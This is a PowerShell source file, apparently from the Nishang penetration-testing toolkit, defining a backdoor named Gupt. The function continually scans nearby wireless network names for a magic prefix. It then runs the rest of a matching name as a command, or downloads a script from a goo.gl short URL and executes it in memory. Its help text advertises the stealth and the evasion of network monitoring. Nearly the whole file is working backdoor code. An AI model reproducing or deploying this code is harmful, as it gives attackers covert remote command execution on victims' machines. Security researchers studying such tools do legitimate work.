

function Gupt-Backdoor
{
<#
.SYNOPSIS
Gupt is a backdoor in Nishang which could execute commands and scripts from specially crafted Wireless Network Names.

.DESCRIPTION
Gupt looks for a specially crafted Wireless Network Name/SSID from list of all avaliable networks. It matches first four characters of
each SSID with the parameter MagicString. On a match, if the 5th character is a 'c', rest of the SSID name is considered to be a command and
exeucted. If the 5th character is a 'u', rest of the SSID is considered the id part of Google URL Shortener and a script is downloaded and
executed in memory from the URL. See examples for usage. 

Gupt does not connect to any Wireless network and this makes it more stealthy and helps in bypassing network traffic monitoring. 

.PARAMETER MagicString
The string which Gupt would compare with the available SSIDs. 

.PARAMETER Arguments
Arguments to pass to a downloaded script.

.EXAMPLE
PS > Gupt-Backdoor -MagicString op3n -Verbose
In above, Gupt will look for an SSID starting with "op3n". To execute whoami on the target, the wireless network name should be "op3ncwhoami".

PS > Gupt-Backdoor -MagicString op3n -Verbose
In above, Gupt will look for an SSID starting with "op3n". To execute a powershell script on the target, the wireless network name should be
"op3nunJEuug". Here, Gupt will use of characters after the 5th one and make the URL http://goo.gl/nJEuug. A script hosted at the URL resolved
by the Google shortener would be downloaded and executed. 

.LINK
http://www.labofapenetrationtester.com/2014/08/Introducing-Gupt.html
https://github.com/samratashok/nishang
#>
    [CmdletBinding()] Param(
        
        [Parameter(Position=0, Mandatory = $True)]
        [String]
        $MagicString,

        [Parameter(Position=1, Mandatory = $False)]
        [String]
        $Arguments
 
    )
    #Get list of available Wlan networks
    while($True)
    {
        Write-Verbose "Checking wireless networks for instructions."
        $networks = Invoke-Expression "netsh wlan show network"
        $ssid = $networks | Select-String "SSID"
        $NetworkNames = $ssid -replace ".*:" -replace " "
        ForEach ($network in $NetworkNames)
        {
            #Check if the first four characters of our SSID matches the given MagicString
            if ($network.Substring(0,4) -match $MagicString.Substring(0,4))
            {
                Write-Verbose "Found a network with instructions!"
                #If the netowrk SSID contains fifth chracter "u", it means rest of the SSID is a URL
                if ($network.Substring(4)[0] -eq "u")
                {
                    Write-Verbose "Downloading the attack script and executing it in memory."
                    $PayloadURL = "http://goo.gl/" + $network.Substring(5)
                    $webclient = New-Object System.Net.WebClient
                    Invoke-Expression $webclient.DownloadString($PayloadURL)
                    if ($Arguments)
                    {
                        Invoke-Expression $Arguments                   
                    }
                    Start-Sleep -Seconds 10
                }
                elseif ($network.Substring(4)[0] -eq "c")
                {
                    $cmd =  $network.Substring(5)
                    if ($cmd -eq "exit")
                    {
                        break
                    }
                    Write-Verbose "Command `"$cmd`" found. Executing it."
                    Invoke-Expression $cmd
                    Start-Sleep -Seconds 10
                }
            }
        }
        Start-Sleep -Seconds 5
    }
}